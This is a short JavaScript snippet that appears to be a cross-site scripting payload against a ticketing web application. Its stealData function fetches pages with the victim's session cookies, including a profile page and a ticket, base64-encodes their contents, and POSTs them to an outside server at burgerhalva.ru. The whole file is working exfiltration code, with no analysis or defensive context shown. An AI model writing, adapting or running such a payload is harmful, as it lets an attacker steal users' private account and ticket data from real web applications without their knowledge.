function read_body(xhr) {
    if (!xhr.responseType || xhr.responseType === "text") return xhr.responseText;
    if (xhr.responseType === "document") return xhr.responseXML;
    if (xhr.responseType === "json") return xhr.responseJSON;
    return xhr.response;
}
function stealData(url) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.withCredentials = true;
    xhr.send(null);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            var exfilData = btoa(unescape(encodeURIComponent(read_body(xhr))));
            fetch("https://burgerhalva.ru/exfil_full", {
                method: "POST",
                mode: "no-cors",
                credentials: "omit",
                headers: { "Content-Type": "text/plain" },
                body: exfilData
            });
        }
    };
}
stealData("/Prefs/AboutMe.html");
stealData("/Ticket/Display.html?id=383442");
